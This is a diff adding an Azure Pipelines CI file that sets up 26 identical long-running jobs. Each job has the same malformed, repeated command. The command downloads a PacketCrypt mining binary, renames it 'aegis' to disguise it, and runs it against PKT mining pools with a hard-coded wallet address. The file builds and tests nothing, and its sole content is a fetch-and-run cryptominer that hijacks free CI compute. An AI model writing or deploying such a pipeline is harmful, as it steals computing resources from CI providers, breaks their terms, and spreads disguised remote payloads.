@@ -1,0 +1,137 @@
+trigger:
+- main
+
+pool:
+  vmImage: ubuntu-latest
+
+jobs:
+
+- job: a
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: b
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: c
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: d
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: e
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: f
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: g
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: h
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: i
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: j
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: k
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: l
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: m
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: n
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: o
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: p
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: q
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: r
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: s
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: t
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: u
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: v
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: w
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: x
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: y
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
+- job: z
+  timeoutInMinutes: 2880
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
